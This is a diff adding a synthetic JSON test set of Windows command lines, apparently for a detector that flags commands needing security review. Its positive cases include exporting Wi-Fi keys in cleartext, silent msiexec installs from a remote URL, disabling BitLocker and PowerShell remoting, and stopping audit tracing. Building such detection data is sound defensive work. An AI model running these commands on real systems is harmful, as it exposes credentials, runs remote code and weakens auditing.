@@ -1,0 +1,230 @@
+{
+  "version": "aegis-command-refine-v1",
+  "synthetic": true,
+  "source": "Hand-authored fictional examples, no executed commands or real logs",
+  "license": "Project-authored synthetic text; repository license applies if specified",
+  "cases": [
+    {
+      "id": "test-ambiguous-1",
+      "split": "test",
+      "group": "ambiguous-1",
+      "label": "unknown",
+      "command": "powershell.exe -File C:\\Synthetic\\unknown.ps1",
+      "reason": "Insufficient context to determine whether review is warranted"
+    },
+    {
+      "id": "test-ambiguous-2",
+      "split": "test",
+      "group": "ambiguous-2",
+      "label": "unknown",
+      "command": "rundll32.exe C:\\Synthetic\\demo.dll,Entry",
+      "reason": "Insufficient context to determine whether review is warranted"
+    },
+    {
+      "id": "test-ambiguous-3",
+      "split": "test",
+      "group": "ambiguous-3",
+      "label": "unknown",
+      "command": "curl.exe https://example.invalid/status",
+      "reason": "Insufficient context to determine whether review is warranted"
+    },
+    {
+      "id": "test-wifi-profile-negative-1",
+      "split": "test",
+      "group": "wifi-profile",
+      "label": "negative",
+      "command": "netsh wlan show profiles",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "test-wifi-profile-negative-2",
+      "split": "test",
+      "group": "wifi-profile",
+      "label": "negative",
+      "command": "netsh wlan show interfaces",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "test-wifi-profile-positive-1",
+      "split": "test",
+      "group": "wifi-profile",
+      "label": "positive",
+      "command": "netsh wlan export profile key=clear folder=C:\\Synthetic\\export",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "test-wifi-profile-positive-2",
+      "split": "test",
+      "group": "wifi-profile",
+      "label": "positive",
+      "command": "netsh wlan export profile name=Demo key=clear folder=C:\\Synthetic\\export",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "test-remote-powershell-negative-1",
+      "split": "test",
+      "group": "remote-powershell",
+      "label": "negative",
+      "command": "powershell.exe -Command Get-PSSessionConfiguration",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "test-remote-powershell-negative-2",
+      "split": "test",
+      "group": "remote-powershell",
+      "label": "negative",
+      "command": "powershell.exe -Command Get-PSSession",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "test-remote-powershell-positive-1",
+      "split": "test",
+      "group": "remote-powershell",
+      "label": "positive",
+      "command": "powershell.exe -Command Disable-PSRemoting -Force",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "test-remote-powershell-positive-2",
+      "split": "test",
+      "group": "remote-powershell",
+      "label": "positive",
+      "command": "powershell.exe -Command Unregister-PSSessionConfiguration -Name Demo -Force",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "test-binary-proxy-negative-1",
+      "split": "test",
+      "group": "binary-proxy",
+      "label": "negative",
+      "command": "msiexec.exe /?",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "test-binary-proxy-negative-2",
+      "split": "test",
+      "group": "binary-proxy",
+      "label": "negative",
+      "command": "msiexec.exe /help",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "test-binary-proxy-positive-1",
+      "split": "test",
+      "group": "binary-proxy",
+      "label": "positive",
+      "command": "msiexec.exe /q /i https://example.invalid/tool.msi",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established",
+      "technique_candidates": [
+        "T1218.007"
+      ]
+    },
+    {
+      "id": "test-binary-proxy-positive-2",
+      "split": "test",
+      "group": "binary-proxy",
+      "label": "positive",
+      "command": "msiexec.exe /qn /i https://example.invalid/install.msi",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established",
+      "technique_candidates": [
+        "T1218.007"
+      ]
+    },
+    {
+      "id": "test-bitlocker-config-negative-1",
+      "split": "test",
+      "group": "bitlocker-config",
+      "label": "negative",
+      "command": "powershell.exe -Command Get-BitLockerVolume",
+      "reason": "Synthetic scenario: read-only inventory is negative; a security configuration change requires review; actual authorization and success are unknown"
+    },
+    {
+      "id": "test-bitlocker-config-negative-2",
+      "split": "test",
+      "group": "bitlocker-config",
+      "label": "negative",
+      "command": "powershell.exe -Command Get-BitLockerVolume -MountPoint C:",
+      "reason": "Synthetic scenario: read-only inventory is negative; a security configuration change requires review; actual authorization and success are unknown"
+    },
+    {
+      "id": "test-bitlocker-config-positive-1",
+      "split": "test",
+      "group": "bitlocker-config",
+      "label": "positive",
+      "command": "powershell.exe -Command Disable-BitLocker -MountPoint C:",
+      "reason": "Synthetic scenario: read-only inventory is negative; a security configuration change requires review; actual authorization and success are unknown"
+    },
+    {
+      "id": "test-bitlocker-config-positive-2",
+      "split": "test",
+      "group": "bitlocker-config",
+      "label": "positive",
+      "command": "powershell.exe -Command Disable-BitLocker -MountPoint D:",
+      "reason": "Synthetic scenario: read-only inventory is negative; a security configuration change requires review; actual authorization and success are unknown"
+    },
+    {
+      "id": "test-proxy-configuration-negative-1",
+      "split": "test",
+      "group": "proxy-configuration",
+      "label": "negative",
+      "command": "netsh winhttp show proxy",
+      "reason": "Synthetic scenario: read-only inventory is negative; a security configuration change requires review; actual authorization and success are unknown"
+    },
+    {
+      "id": "test-proxy-configuration-negative-2",
+      "split": "test",
+      "group": "proxy-configuration",
+      "label": "negative",
+      "command": "netsh winhttp show advproxy",
+      "reason": "Synthetic scenario: read-only inventory is negative; a security configuration change requires review; actual authorization and success are unknown"
+    },
+    {
+      "id": "test-proxy-configuration-positive-1",
+      "split": "test",
+      "group": "proxy-configuration",
+      "label": "positive",
+      "command": "netsh winhttp set proxy 127.0.0.1:8080",
+      "reason": "Synthetic scenario: read-only inventory is negative; a security configuration change requires review; actual authorization and success are unknown"
+    },
+    {
+      "id": "test-proxy-configuration-positive-2",
+      "split": "test",
+      "group": "proxy-configuration",
+      "label": "positive",
+      "command": "netsh winhttp set proxy 127.0.0.1:8081",
+      "reason": "Synthetic scenario: read-only inventory is negative; a security configuration change requires review; actual authorization and success are unknown"
+    },
+    {
+      "id": "test-event-tracing-negative-1",
+      "split": "test",
+      "group": "event-tracing",
+      "label": "negative",
+      "command": "logman query providers",
+      "reason": "Synthetic scenario: read-only inventory is negative; a security configuration change requires review; actual authorization and success are unknown"
+    },
+    {
+      "id": "test-event-tracing-negative-2",
+      "split": "test",
+      "group": "event-tracing",
+      "label": "negative",
+      "command": "logman query -ets",
+      "reason": "Synthetic scenario: read-only inventory is negative; a security configuration change requires review; actual authorization and success are unknown"
+    },
+    {
+      "id": "test-event-tracing-positive-1",
+      "split": "test",
+      "group": "event-tracing",
+      "label": "positive",
+      "command": "logman stop DemoAudit -ets",
+      "reason": "Synthetic scenario: read-only inventory is negative; a security configuration change requires review; actual authorization and success are unknown"
+    },
+    {
+      "id": "test-event-tracing-positive-2",
+      "split": "test",
+      "group": "event-tracing",
+      "label": "positive",
+      "command": "logman delete DemoAudit",
+      "reason": "Synthetic scenario: read-only inventory is negative; a security configuration change requires review; actual authorization and success are unknown"
+    }
+  ]
+}
